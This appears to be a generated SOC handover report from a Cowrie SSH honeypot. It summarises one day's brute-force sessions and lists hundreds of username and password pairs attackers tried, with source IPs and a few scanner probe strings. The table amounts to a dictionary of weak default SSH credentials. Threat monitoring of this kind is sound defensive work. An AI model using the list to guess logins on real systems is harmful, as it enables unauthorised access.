# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-09 |
| **Generated At** | 2026-08-09T12:59:01Z |
| **Shift Time** | 12:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **402** |
| Confirmed Threats | **347** |
| False Positives Filtered | **55** (13.7%) |
| Unique Attacker IPs | **139** |
| Countries of Origin | **44** |
| High Severity Cases | **132** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **270** |
| Malware Samples Analyzed | **2** HIGH · **22** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **473** |
| Unique Credential Pairs | **390** |
| Unique Usernames | **29** |
| Unique Passwords | **378** |
| Successful Auth Pairs | **435** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 367 |
| `admin` | 24 |
| `support` | 12 |
| `guest` | 6 |
| `user` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `` | 15 |
| `123456a` | 10 |
| `support` | 8 |
| `admin` | 6 |
| `P@ssw0rd` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 8 |
| `admin` | `123456a` | 6 |
| `admin` | `admin` | 5 |
| `guest` | `P@ssw0rd` | 5 |
| `admin` | `webmaster` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `12` | `12` | `186.239.41.74` | 2026-08-09T08:55:03 |
| `12` | `12` | `202.138.229.190` | 2026-08-09T08:55:18 |
| `admin` | `admin` | `47.253.5.130` | 2026-08-09T08:57:30 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-09T08:57:30 |
| `support` | `support` | `10.0.0.73` | 2026-08-09T08:59:12 |
| `admin` | `123456a` | `218.59.235.170` | 2026-08-09T09:02:18 |
| `admin` | `123456a` | `49.206.194.29` | 2026-08-09T09:02:32 |
| `root` | `Everest123` | `10.0.0.73` | 2026-08-09T09:04:46 |
| `root` | `QAZwsx@#` | `10.0.0.73` | 2026-08-09T09:05:24 |
| `root` | `ksLngd83nm` | `10.0.0.73` | 2026-08-09T09:06:05 |
| `root` | `q1w2e3r4ZBY` | `10.0.0.73` | 2026-08-09T09:06:16 |
| `root` | `peute0815!` | `10.0.0.73` | 2026-08-09T09:07:20 |
| `root` | `AdMiN1@3` | `10.0.0.73` | 2026-08-09T09:07:37 |
| `root` | `!Password12` | `10.0.0.73` | 2026-08-09T09:07:48 |
| `root` | `setup123!` | `10.0.0.73` | 2026-08-09T09:07:56 |
| `root` | `Letmein12!` | `10.0.0.73` | 2026-08-09T09:08:33 |
| `root` | `1234567@A` | `10.0.0.73` | 2026-08-09T09:08:49 |
| `root` | `AdmiN123!` | `10.0.0.73` | 2026-08-09T09:08:53 |
| `root` | `Computer12!` | `10.0.0.73` | 2026-08-09T09:09:14 |
| `root` | `vps1234!` | `10.0.0.73` | 2026-08-09T09:09:26 |
| `root` | `vps123456!` | `10.0.0.73` | 2026-08-09T09:09:31 |
| `root` | `A1a1!` | `10.0.0.73` | 2026-08-09T09:09:48 |
| `root` | `aspnet123!` | `10.0.0.73` | 2026-08-09T09:10:28 |
| `root` | `590426` | `10.0.0.73` | 2026-08-09T09:11:05 |
| `root` | `Password123456!` | `10.0.0.73` | 2026-08-09T09:11:17 |
| `root` | `idc!@#sa321` | `10.0.0.73` | 2026-08-09T09:11:44 |
| `root` | `idc1qazxsw@#edc` | `10.0.0.73` | 2026-08-09T09:12:18 |
| `admin` | `123456a` | `10.0.0.73` | 2026-08-09T09:14:10 |
| `root` | `sa@1433` | `10.0.0.73` | 2026-08-09T09:14:25 |
| `root` | `sql123!@#` | `10.0.0.73` | 2026-08-09T09:14:38 |
| `root` | `123@@@` | `140.245.50.204` | 2026-08-09T09:14:56 |
| `root` | `LeitboGi0ro` | `140.245.50.204` | 2026-08-09T09:14:58 |
| `root` | `smo@@kkklss` | `140.245.50.204` | 2026-08-09T09:15:00 |
| `root` | `vvv123!@#` | `10.0.0.73` | 2026-08-09T09:15:08 |
| `root` | `xianhaicheng@123` | `10.0.0.73` | 2026-08-09T09:15:21 |
| `root` | `1QAZ!@#` | `10.0.0.73` | 2026-08-09T09:16:54 |
| `root` | `Adm1n1str@tor2012` | `10.0.0.73` | 2026-08-09T09:17:27 |
| `root` | `P@55WORD12345` | `10.0.0.73` | 2026-08-09T09:17:57 |
| `root` | `B3SADM1N@!` | `10.0.0.73` | 2026-08-09T09:18:06 |
| `root` | `P@55WORD88` | `10.0.0.73` | 2026-08-09T09:18:37 |
| `root` | `ADM1N1STR@T0R12345` | `10.0.0.73` | 2026-08-09T09:19:45 |
| `root` | `Studio@!` | `10.0.0.73` | 2026-08-09T09:20:35 |
| `root` | `Support!.` | `10.0.0.73` | 2026-08-09T09:20:59 |
| `root` | `P@ssw0rd@.` | `10.0.0.73` | 2026-08-09T09:21:17 |
| `root` | `Adm0` | `10.0.0.73` | 2026-08-09T09:21:50 |
| `root` | `Sc@nn3r66` | `10.0.0.73` | 2026-08-09T09:22:27 |
| `root` | `Ufficio66` | `10.0.0.73` | 2026-08-09T09:23:11 |
| `root` | `Sichern2003` | `10.0.0.73` | 2026-08-09T09:23:45 |
| `root` | `Buro!@` | `10.0.0.73` | 2026-08-09T09:24:15 |
| `root` | `Amministrateur2003` | `10.0.0.73` | 2026-08-09T09:24:29 |
| `root` | `L0CAT3!` | `10.0.0.73` | 2026-08-09T09:24:36 |
| `root` | `Adm1n1str@tor88` | `10.0.0.73` | 2026-08-09T09:25:12 |
| `root` | `Administrat0r2012` | `10.0.0.73` | 2026-08-09T09:25:17 |
| `root` | `Amministrator2009` | `10.0.0.73` | 2026-08-09T09:25:50 |
| `root` | `CONT@CT2009` | `10.0.0.73` | 2026-08-09T09:26:06 |
| `root` | `Librarry2013` | `10.0.0.73` | 2026-08-09T09:26:45 |
| `root` | `Besadmin11` | `10.0.0.73` | 2026-08-09T09:27:51 |
| `root` | `Verwalter@.` | `10.0.0.73` | 2026-08-09T09:28:08 |
| `root` | `Amministrator22` | `10.0.0.73` | 2026-08-09T09:28:29 |
| `root` | `SCANN3R!.` | `10.0.0.73` | 2026-08-09T09:28:32 |
| `root` | `Ufficio123` | `10.0.0.73` | 2026-08-09T09:28:39 |
| `root` | `Admin@.` | `10.0.0.73` | 2026-08-09T09:29:46 |
| `root` | `590426` | `61.2.44.54` | 2026-08-09T09:30:00 |
| `root` | `Sc@nn3r12345` | `10.0.0.73` | 2026-08-09T09:30:32 |
| `root` | `Games.!` | `10.0.0.73` | 2026-08-09T09:30:46 |
| `root` | `Sc@nn3r2007` | `10.0.0.73` | 2026-08-09T09:30:48 |
| `root` | `B3sadmin44` | `10.0.0.73` | 2026-08-09T09:31:09 |
| `root` | `Verwalter@` | `10.0.0.73` | 2026-08-09T09:31:15 |
| `admin` | `123456a` | `85.19.195.12` | 2026-08-09T09:31:34 |
| `admin` | `123456a` | `223.99.212.58` | 2026-08-09T09:31:47 |
| `root` | `Bureau2008` | `10.0.0.73` | 2026-08-09T09:31:50 |
| `root` | `Amministrator.@` | `10.0.0.73` | 2026-08-09T09:32:26 |
| `root` | `USER2!` | `10.0.0.73` | 2026-08-09T09:32:51 |
| `root` | `ADM1N1STR@TOR!.` | `10.0.0.73` | 2026-08-09T09:33:35 |
| `root` | `Scann3r77` | `10.0.0.73` | 2026-08-09T09:34:36 |
| `support` | `44` | `10.0.0.73` | 2026-08-09T09:34:44 |
| `root` | `Password!.` | `10.0.0.73` | 2026-08-09T09:35:33 |
| `root` | `Studio88` | `10.0.0.73` | 2026-08-09T09:35:33 |
| `root` | `B3sadm1n.@` | `10.0.0.73` | 2026-08-09T09:35:42 |
| `root` | `SC@NN3R2010` | `10.0.0.73` | 2026-08-09T09:36:12 |
| `support` | `44` | `196.203.231.220` | 2026-08-09T09:36:20 |
| `support` | `44` | `220.93.167.144` | 2026-08-09T09:36:28 |
| `root` | `Beheerder2009` | `10.0.0.73` | 2026-08-09T09:37:26 |
| `root` | `ADM1N1STRATOR!@` | `10.0.0.73` | 2026-08-09T09:38:06 |
| `root` | `Ufficio2002` | `10.0.0.73` | 2026-08-09T09:38:54 |
| `root` | `Administr@tor77` | `10.0.0.73` | 2026-08-09T09:40:31 |
| `root` | `Empfang12` | `10.0.0.73` | 2026-08-09T09:40:49 |
| `root` | `SC@NNER123` | `10.0.0.73` | 2026-08-09T09:41:11 |
| `root` | `Supp0rt.!` | `10.0.0.73` | 2026-08-09T09:41:29 |
| `root` | `Supp0rt2006` | `10.0.0.73` | 2026-08-09T09:42:13 |
| `root` | `Adm.!` | `10.0.0.73` | 2026-08-09T09:43:10 |
| `User` | `User2011` | `10.0.0.73` | 2026-08-09T09:45:42 |
| `root` | `Buro2013` | `10.0.0.73` | 2026-08-09T09:46:53 |
| `root` | `Sc@nn3r55` | `10.0.0.73` | 2026-08-09T09:47:07 |
| `root` | `Adm1n1str@t0r99` | `10.0.0.73` | 2026-08-09T09:47:48 |
| `mail` | `mail` | `10.0.0.73` | 2026-08-09T09:48:57 |
| `root` | `ADM1N@` | `10.0.0.73` | 2026-08-09T09:49:13 |
| `root` | `Administrat0r66` | `10.0.0.73` | 2026-08-09T09:49:57 |
| `root` | `SC@NNER0` | `10.0.0.73` | 2026-08-09T09:51:32 |
| `root` | `Empfang2013` | `10.0.0.73` | 2026-08-09T09:52:17 |
| `root` | `Supp0rt88` | `10.0.0.73` | 2026-08-09T09:52:43 |
| `root` | `SC@NNER2005` | `10.0.0.73` | 2026-08-09T09:52:45 |
| `root` | `Adm1n1str@tor2009` | `10.0.0.73` | 2026-08-09T09:53:06 |
| `root` | `Adm1n1str@t0r2005` | `10.0.0.73` | 2026-08-09T09:53:11 |
| `root` | `Utente2002` | `10.0.0.73` | 2026-08-09T09:53:39 |
| `root` | `Besadm1n@!` | `10.0.0.73` | 2026-08-09T09:53:46 |
| `root` | `Adm1n0` | `10.0.0.73` | 2026-08-09T09:55:32 |
| `root` | `Studio2007` | `10.0.0.73` | 2026-08-09T09:55:57 |
| `admin` | `admin` | `116.110.215.21` | 2026-08-09T09:56:08 |
| `root` | `Besadm1n77` | `10.0.0.73` | 2026-08-09T09:56:26 |
| `root` | `Administrateur1234` | `10.0.0.73` | 2026-08-09T09:56:31 |
| `root` | `Home99` | `10.0.0.73` | 2026-08-09T09:56:39 |
| `root` | `Reception11` | `10.0.0.73` | 2026-08-09T09:56:53 |
| `root` | `Administrat0r.@` | `10.0.0.73` | 2026-08-09T09:57:07 |
| `root` | `Administr@tor2007` | `10.0.0.73` | 2026-08-09T09:57:23 |
| `root` | `Utilisateur!@` | `10.0.0.73` | 2026-08-09T09:57:49 |
| `root` | `Librarry22` | `10.0.0.73` | 2026-08-09T09:58:02 |
| `root` | `Games2007` | `10.0.0.73` | 2026-08-09T09:58:17 |
| `root` | `admin` | `116.99.171.175` | 2026-08-09T09:58:39 |
| `root` | `Besadm1n44` | `10.0.0.73` | 2026-08-09T09:58:48 |
| `root` | `Ufficio99` | `10.0.0.73` | 2026-08-09T09:59:25 |
| `root` | `Administrateur.!` | `10.0.0.73` | 2026-08-09T09:59:43 |
| `root` | `Amministrator@!` | `10.0.0.73` | 2026-08-09T09:59:51 |
| `root` | `DB3ADMIN!@` | `10.0.0.73` | 2026-08-09T09:59:57 |
| `installer` | `installer` | `116.99.171.175` | 2026-08-09T10:00:29 |
| `admin` | `admin` | `91.219.23.163` | 2026-08-09T10:00:31 |
| `root` | `ADM1N1STR@TOR2007` | `10.0.0.73` | 2026-08-09T10:01:18 |
| `root` | `Scann3r88` | `10.0.0.73` | 2026-08-09T10:01:54 |
| `root` | `Password31` | `10.0.0.73` | 2026-08-09T10:02:42 |
| `user` | `user` | `116.110.215.21` | 2026-08-09T10:02:54 |
| `User` | `User2011` | `111.70.32.49` | 2026-08-09T10:04:30 |
| `User` | `User2011` | `203.252.10.4` | 2026-08-09T10:04:40 |
| `root` | `Password62` | `10.0.0.73` | 2026-08-09T10:04:44 |
| `User` | `User2011` | `41.224.62.206` | 2026-08-09T10:04:47 |
| `ubnt` | `ubnt` | `116.99.171.175` | 2026-08-09T10:05:17 |
| `root` | `Password79` | `10.0.0.73` | 2026-08-09T10:05:24 |
| `root` | `Password84` | `10.0.0.73` | 2026-08-09T10:05:41 |
| `root` | `Password89` | `10.0.0.73` | 2026-08-09T10:06:01 |
| `squid` | `squid` | `116.110.215.21` | 2026-08-09T10:06:11 |
| `root` | `Password98` | `10.0.0.73` | 2026-08-09T10:06:42 |
| `root` | `Passw0rd17` | `10.0.0.73` | 2026-08-09T10:06:50 |
| `root` | `Passw0rd24` | `10.0.0.73` | 2026-08-09T10:07:19 |
| `root` | `Passw0rd26` | `10.0.0.73` | 2026-08-09T10:07:30 |
| `root` | `Passw0rd32` | `10.0.0.73` | 2026-08-09T10:07:59 |
| `root` | `Passw0rd35` | `10.0.0.73` | 2026-08-09T10:08:10 |
| `config` | `config` | `116.99.171.175` | 2026-08-09T10:09:00 |
| `root` | `dreambox` | `10.0.0.73` | 2026-08-09T10:09:27 |
| `root` | `Passw0rd58` | `10.0.0.73` | 2026-08-09T10:10:02 |
| `root` | `Passw0rd64` | `10.0.0.73` | 2026-08-09T10:10:29 |
| `support` | `support` | `116.110.215.21` | 2026-08-09T10:10:44 |
| `root` | `Passw0rd72` | `10.0.0.73` | 2026-08-09T10:11:12 |
| `root` | `Passw0rd73` | `10.0.0.73` | 2026-08-09T10:11:18 |
| `guest` | `P@ssw0rd` | `210.177.143.61` | 2026-08-09T10:11:31 |
| `root` | `Passw0rd81` | `10.0.0.73` | 2026-08-09T10:11:53 |
| `root` | `Passw0rd87` | `10.0.0.73` | 2026-08-09T10:12:21 |
| `root` | `Passw0rd88` | `10.0.0.73` | 2026-08-09T10:12:27 |
| `root` | `Passw0rd89` | `10.0.0.73` | 2026-08-09T10:12:31 |
| `root` | `P@ssw0rd16` | `10.0.0.73` | 2026-08-09T10:13:28 |
| `GET / HTTP/1.0` | `` | `45.79.102.191` | 2026-08-09T10:14:53 |
| `root` | `P@ssw0rd43` | `10.0.0.73` | 2026-08-09T10:14:58 |
| `OPTIONS / HTTP/1.0` | `` | `45.79.102.191` | 2026-08-09T10:15:00 |
| `OPTIONS / RTSP/1.0` | `` | `45.79.102.191` | 2026-08-09T10:15:04 |
| `root` | `P@ssw0rd51` | `10.0.0.73` | 2026-08-09T10:15:26 |
| `GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0` | `` | `45.79.102.191` | 2026-08-09T10:15:52 |
| `b'0\x84\x00\x00\x00-\x02\x01\x07c\x84\x00\x00\x00$\x04\x00'` | ` ` | `45.79.102.191` | 2026-08-09T10:16:02 |
| `OPTIONS sip:nm SIP/2.0` | `Via: SIP/2.0/TCP nm;branch=foo` | `45.79.102.191` | 2026-08-09T10:16:12 |
| `root` | `P@ssw0rd68` | `10.0.0.73` | 2026-08-09T10:16:26 |
| `support` | `support` | `176.53.159.196` | 2026-08-09T10:16:31 |
| `root` | `P@ssw0rd71` | `10.0.0.73` | 2026-08-09T10:16:42 |
| `GET /devicedesc.xml HTTP/1.1` | `` | `45.79.102.191` | 2026-08-09T10:17:01 |
| `CONNECT` | `accept-version:1.2` | `45.79.102.191` | 2026-08-09T10:17:07 |
| `root` | `P@ssw0rd78` | `10.0.0.73` | 2026-08-09T10:17:09 |
| `root` | `P@ssw0rd79` | `10.0.0.73` | 2026-08-09T10:17:17 |
| `root` | `P@ssw0rd83` | `10.0.0.73` | 2026-08-09T10:17:25 |
| `admin` | `admin@123` | `116.99.171.175` | 2026-08-09T10:17:51 |
| `root` | `P@ssw0rd96` | `10.0.0.73` | 2026-08-09T10:18:17 |
| `root` | `---fuck_you----` | `120.26.229.104` | 2026-08-09T10:19:13 |
| `root` | `root123` | `116.99.171.175` | 2026-08-09T10:19:52 |
| `root` | `M@$ter` | `10.0.0.73` | 2026-08-09T10:20:09 |
| `root` | `!qabcd1234` | `10.0.0.73` | 2026-08-09T10:20:15 |
| `odroid` | `odroid` | `10.0.0.73` | 2026-08-09T10:20:22 |
| `root` | `p@sswordvps123` | `10.0.0.73` | 2026-08-09T10:20:34 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-09T10:21:04 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-09T10:21:04 |
| `root` | `pa$$word05` | `10.0.0.73` | 2026-08-09T10:21:13 |
| `guest` | `P@ssw0rd` | `10.0.0.73` | 2026-08-09T10:23:14 |
| `root` | `P<ominub` | `10.0.0.73` | 2026-08-09T10:23:28 |
| `guest` | `guest` | `116.110.215.21` | 2026-08-09T10:25:38 |
| `root` | `Qwe.asd.123` | `10.0.0.73` | 2026-08-09T10:25:42 |
| `root` | `R00tr00t!@#` | `10.0.0.73` | 2026-08-09T10:26:03 |
| `root` | `Z/x.c,` | `10.0.0.73` | 2026-08-09T10:26:19 |
| `root` | `dreambox` | `36.137.38.119` | 2026-08-09T10:27:33 |
| `root` | `dreambox` | `49.124.147.100` | 2026-08-09T10:27:49 |
| `test` | `test` | `116.110.215.21` | 2026-08-09T10:28:15 |
| `root` | `win*0` | `10.0.0.73` | 2026-08-09T10:29:03 |
| `root` | `!!aa123` | `10.0.0.73` | 2026-08-09T10:29:51 |
| `root` | `!@#567qweqwe` | `10.0.0.73` | 2026-08-09T10:30:29 |
| `root` | `!@123qwsa` | `10.0.0.73` | 2026-08-09T10:31:19 |
| `root` | `!@qwaszx34` | `10.0.0.73` | 2026-08-09T10:31:45 |
| `root` | `!@wsx34rfv` | `10.0.0.73` | 2026-08-09T10:32:13 |
| `admin` | `password` | `116.110.211.135` | 2026-08-09T10:32:47 |
| `root` | `!aa123` | `10.0.0.73` | 2026-08-09T10:32:54 |
| `root` | `!aa123654` | `10.0.0.73` | 2026-08-09T10:33:05 |
| `root` | `!p@$$w0rd@` | `10.0.0.73` | 2026-08-09T10:33:19 |
| `root` | `!passw0rd1234` | `10.0.0.73` | 2026-08-09T10:33:56 |
| `admin` | `1234` | `116.110.211.135` | 2026-08-09T10:33:59 |
| `root` | `!qa$sw2` | `10.0.0.73` | 2026-08-09T10:34:28 |
| `admin` | `admin01` | `116.110.211.135` | 2026-08-09T10:36:02 |
| `root` | `!qaz1231qaz` | `10.0.0.73` | 2026-08-09T10:36:15 |
| `root` | `!qaz1231qaz@` | `10.0.0.73` | 2026-08-09T10:36:25 |
| `root` | `!qaz1234561qaz` | `10.0.0.73` | 2026-08-09T10:37:25 |
| `admin` | `123456` | `116.110.211.135` | 2026-08-09T10:38:07 |
| `root` | `!qaz5rdz` | `10.0.0.73` | 2026-08-09T10:38:33 |
| `odroid` | `odroid` | `62.183.82.70` | 2026-08-09T10:39:05 |
| `odroid` | `odroid` | `186.239.41.74` | 2026-08-09T10:39:17 |
| `root` | `!qaz@6yhn` | `10.0.0.73` | 2026-08-09T10:39:34 |
| `root` | `!qazqwe1qaz` | `10.0.0.73` | 2026-08-09T10:40:07 |
| `root` | `!qazxsw2*` | `10.0.0.73` | 2026-08-09T10:40:20 |
| `root` | `!qazzaq1@#` | `10.0.0.73` | 2026-08-09T10:40:33 |
| `guest` | `P@ssw0rd` | `82.193.122.91` | 2026-08-09T10:40:43 |
| `guest` | `P@ssw0rd` | `178.178.222.60` | 2026-08-09T10:40:50 |
| `root` | `!qwe!@#123` | `10.0.0.73` | 2026-08-09T10:41:03 |
| `root` | `!qq123!` | `10.0.0.73` | 2026-08-09T10:41:35 |
| `root` | `!qq123!!#` | `10.0.0.73` | 2026-08-09T10:41:43 |
| `root` | `!qq123@` | `10.0.0.73` | 2026-08-09T10:42:22 |
| `root` | `$rfv@4rfv` | `10.0.0.73` | 2026-08-09T10:43:28 |
| `user` | `1234` | `116.110.211.135` | 2026-08-09T10:43:36 |
| `root` | `%admin1%` | `10.0.0.73` | 2026-08-09T10:44:17 |
| `root` | `%admin123123%` | `10.0.0.73` | 2026-08-09T10:44:24 |
| `root` | `%root1234%` | `10.0.0.73` | 2026-08-09T10:45:14 |
| `root` | `%tgb%5tgb` | `10.0.0.73` | 2026-08-09T10:45:23 |
| `ftp` | `ftp` | `116.110.211.135` | 2026-08-09T10:46:23 |
| `root` | `123asdasd!@#` | `10.0.0.73` | 2026-08-09T10:47:03 |
| `root` | `123asd789!` | `10.0.0.73` | 2026-08-09T10:48:09 |
| `root` | `123asdqwe789!` | `10.0.0.73` | 2026-08-09T10:48:40 |
| `root` | `123qwe!@#wsx` | `10.0.0.73` | 2026-08-09T10:49:05 |
| `operator` | `operator` | `116.110.211.135` | 2026-08-09T10:50:15 |
| `root` | `123qweqwe!123` | `10.0.0.73` | 2026-08-09T10:50:18 |
| `root` | `123qweqwe$%^` | `10.0.0.73` | 2026-08-09T10:50:26 |
| `root` | `123qazwsx@789` | `10.0.0.73` | 2026-08-09T10:51:22 |
| `root` | `123qq1@w` | `10.0.0.73` | 2026-08-09T10:52:02 |
| `root` | `123qwe@789` | `10.0.0.73` | 2026-08-09T10:52:15 |
| `root` | `123qweasd@789` | `10.0.0.73` | 2026-08-09T10:52:41 |
| `root` | `123zxczxc!123` | `10.0.0.73` | 2026-08-09T10:53:27 |
| `root` | `123qweqweqwe!` | `10.0.0.73` | 2026-08-09T10:53:48 |
| `root` | `1qaz2wsx#ed` | `10.0.0.73` | 2026-08-09T10:54:15 |
| `root` | `1qaz!qaz_123` | `10.0.0.73` | 2026-08-09T10:55:02 |
| `root` | `1qaz@qweasd` | `10.0.0.73` | 2026-08-09T10:55:48 |
| `root` | `1qaz@wsx789` | `10.0.0.73` | 2026-08-09T10:56:28 |
| `root` | `Czidc.com` | `10.0.0.73` | 2026-08-09T10:58:29 |
| `root` | `!pw4adm` | `10.0.0.73` | 2026-08-09T11:00:09 |
| `root` | `&xpwf95` | `10.0.0.73` | 2026-08-09T11:01:02 |
| `root` | `!root` | `2.57.122.209` | 2026-08-09T11:01:25 |
| `root` | `00-08-a` | `10.0.0.73` | 2026-08-09T11:01:36 |
| `operator` | `66666` | `64.49.97.15` | 2026-08-09T11:02:14 |
| `operator` | `66666` | `121.178.185.141` | 2026-08-09T11:02:27 |
| `root` | `Passwd2007` | `10.0.0.73` | 2026-08-09T11:02:40 |
| `root` | `Buro201` | `10.0.0.73` | 2026-08-09T11:02:53 |
| `root` | `1qaz!qaz@123` | `10.0.0.73` | 2026-08-09T11:03:00 |
| `root` | `1234567@ab` | `10.0.0.73` | 2026-08-09T11:04:00 |
| `root` | `111111` | `2.57.122.209` | 2026-08-09T11:04:41 |
| `root` | `12345678-ab` | `10.0.0.73` | 2026-08-09T11:05:15 |
| `root` | `12345-abc` | `10.0.0.73` | 2026-08-09T11:05:49 |
| `root` | `1q@w#e$r%t^y&u*i(o)p` | `10.0.0.73` | 2026-08-09T11:06:54 |
| `root` | `654321qaz@wsx` | `10.0.0.73` | 2026-08-09T11:07:21 |
| `root` | `123123` | `2.57.122.209` | 2026-08-09T11:07:49 |
| `root` | `qwe1!@#$` | `10.0.0.73` | 2026-08-09T11:08:14 |
| `root` | `qwer12345!@#$` | `10.0.0.73` | 2026-08-09T11:08:35 |
| `root` | `Ad123456` | `10.0.0.73` | 2026-08-09T11:09:02 |
| `root` | `ab@123` | `10.0.0.73` | 2026-08-09T11:10:33 |
| `root` | `123321` | `2.57.122.209` | 2026-08-09T11:10:50 |
| `root` | `!P@ssw0rd` | `10.0.0.73` | 2026-08-09T11:11:01 |
| `root` | `Qwer!@#$` | `10.0.0.73` | 2026-08-09T11:11:17 |
| `root` | `Ibm123` | `10.0.0.73` | 2026-08-09T11:11:21 |
| `root` | `Abc123$` | `10.0.0.73` | 2026-08-09T11:11:46 |
| `root` | `123.COM` | `10.0.0.73` | 2026-08-09T11:12:00 |
| `root` | `aA1234567890` | `10.0.0.73` | 2026-08-09T11:13:00 |
| `admin` | `superuser` | `220.246.43.109` | 2026-08-09T11:13:35 |
| `root` | `1234` | `2.57.122.209` | 2026-08-09T11:13:40 |
| `admin` | `superuser` | `102.211.7.162` | 2026-08-09T11:13:43 |
| `admin` | `superuser` | `200.199.32.174` | 2026-08-09T11:13:49 |
| `root` | `123QWEasdZXC` | `10.0.0.73` | 2026-08-09T11:14:13 |
| `root` | `admin1!` | `10.0.0.73` | 2026-08-09T11:14:18 |
| `root` | `Abc-123` | `10.0.0.73` | 2026-08-09T11:14:56 |
| `root` | `!Password01` | `10.0.0.73` | 2026-08-09T11:15:19 |
| `root` | `teamftp!@#$` | `10.0.0.73` | 2026-08-09T11:15:29 |
| `root` | `Adm1234` | `10.0.0.73` | 2026-08-09T11:15:38 |
| `root` | `12345` | `2.57.122.209` | 2026-08-09T11:16:30 |
| `root` | `@dm!n1*` | `10.0.0.73` | 2026-08-09T11:17:36 |
| `default` | `12345678` | `10.0.0.73` | 2026-08-09T11:18:48 |
| `root` | `1q2w3E` | `10.0.0.73` | 2026-08-09T11:20:07 |
| `root` | `7ujMko0admin` | `121.202.198.98` | 2026-08-09T11:20:39 |
| `root` | `7ujMko0admin` | `87.103.126.54` | 2026-08-09T11:20:50 |
| `root` | `qwert@12345` | `10.0.0.73` | 2026-08-09T11:21:02 |
| `root` | `Admin123~` | `10.0.0.73` | 2026-08-09T11:21:14 |
| `root` | `1234567` | `2.57.122.209` | 2026-08-09T11:21:42 |
| `root` | `ubuntu` | `158.51.96.38` | 2026-08-09T11:21:56 |
| `root` | `Abcd.123` | `10.0.0.73` | 2026-08-09T11:22:00 |
| `root` | `aa1` | `10.0.0.73` | 2026-08-09T11:22:19 |
| `root` | `12345678` | `2.57.122.209` | 2026-08-09T11:24:21 |
| `root` | `vps@123` | `10.0.0.73` | 2026-08-09T11:24:57 |
| `root` | `@WSXCDE#` | `10.0.0.73` | 2026-08-09T11:25:04 |
| `root` | `123qtwAGD` | `10.0.0.73` | 2026-08-09T11:25:31 |
| `root` | `123456789` | `2.57.122.209` | 2026-08-09T11:26:42 |
| `root` | `Aa0123456` | `10.0.0.73` | 2026-08-09T11:28:27 |
| `root` | `1234567890` | `2.57.122.209` | 2026-08-09T11:29:07 |
| `root` | `1988` | `10.0.0.73` | 2026-08-09T11:29:34 |
| `root` | `Win208++` | `10.0.0.73` | 2026-08-09T11:29:45 |
| `root` | `Open*123` | `10.0.0.73` | 2026-08-09T11:30:23 |
| `root` | `aaa111++` | `10.0.0.73` | 2026-08-09T11:30:55 |
| `root` | `QQQ111` | `10.0.0.73` | 2026-08-09T11:31:18 |
| `root` | `123456a` | `2.57.122.209` | 2026-08-09T11:31:36 |
| `root` | `!QAZ3edc` | `10.0.0.73` | 2026-08-09T11:31:48 |
| `root` | `P4ssword` | `10.0.0.73` | 2026-08-09T11:32:24 |
| `root` | `7ujMko0admin` | `10.0.0.73` | 2026-08-09T11:32:28 |
| `root` | `1234@ABCD` | `10.0.0.73` | 2026-08-09T11:32:36 |
| `root` | `!@#123qweasd` | `10.0.0.73` | 2026-08-09T11:32:50 |
| `root` | `Dell3` | `10.0.0.73` | 2026-08-09T11:33:28 |
| `root` | `123456b` | `2.57.122.209` | 2026-08-09T11:33:52 |
| `root` | `1234abcd` | `2.57.122.209` | 2026-08-09T11:36:14 |
| `default` | `12345678` | `220.246.43.172` | 2026-08-09T11:37:01 |
| `default` | `12345678` | `65.20.198.159` | 2026-08-09T11:37:10 |
| `root` | `Qq147258!@#` | `10.0.0.73` | 2026-08-09T11:37:24 |
| `root` | `123abc` | `2.57.122.209` | 2026-08-09T11:38:29 |
| `root` | `Abcd1235` | `10.0.0.73` | 2026-08-09T11:39:07 |
| `root` | `Abcdf123` | `10.0.0.73` | 2026-08-09T11:39:25 |
| `root` | `fast@123` | `10.0.0.73` | 2026-08-09T11:39:35 |
| `root` | `1qaz@wsx#edc` | `10.0.0.73` | 2026-08-09T11:40:05 |
| `root` | `1Q2W3E4R` | `10.0.0.73` | 2026-08-09T11:40:39 |
| `root` | `123qwe` | `2.57.122.209` | 2026-08-09T11:40:52 |
| `root` | `1aA!` | `10.0.0.73` | 2026-08-09T11:41:04 |
| `root` | `1zaq12xsw2` | `10.0.0.73` | 2026-08-09T11:41:31 |
| `root` | `Work@2025` | `51.77.158.34` | 2026-08-09T11:42:08 |
| `345gs5662d34` | `345gs5662d34` | `51.77.158.34` | 2026-08-09T11:42:10 |
| `root` | `3245gs5662d34` | `51.77.158.34` | 2026-08-09T11:42:11 |
| `root` | `1qwe3zxc!@#` | `10.0.0.73` | 2026-08-09T11:42:50 |
| `root` | `1qwe3zxc.` | `10.0.0.73` | 2026-08-09T11:42:55 |
| `apache` | `apache` | `115.178.75.243` | 2026-08-09T11:43:04 |
| `345gs5662d34` | `345gs5662d34` | `115.178.75.243` | 2026-08-09T11:43:07 |
| `apache` | `3245gs5662d34` | `115.178.75.243` | 2026-08-09T11:43:09 |
| `root` | `1q2w3e4r` | `2.57.122.209` | 2026-08-09T11:43:16 |
| `root` | `A12345` | `10.0.0.73` | 2026-08-09T11:43:34 |
| `root` | `QAZ12345wsx` | `10.0.0.73` | 2026-08-09T11:44:26 |
| `root` | `Huawei@123456` | `102.140.97.134` | 2026-08-09T11:44:43 |
| `345gs5662d34` | `345gs5662d34` | `102.140.97.134` | 2026-08-09T11:44:46 |
| `root` | `3245gs5662d34` | `102.140.97.134` | 2026-08-09T11:44:47 |
| `root` | `beyond` | `103.146.159.173` | 2026-08-09T11:45:52 |
| `345gs5662d34` | `345gs5662d34` | `103.146.159.173` | 2026-08-09T11:45:55 |
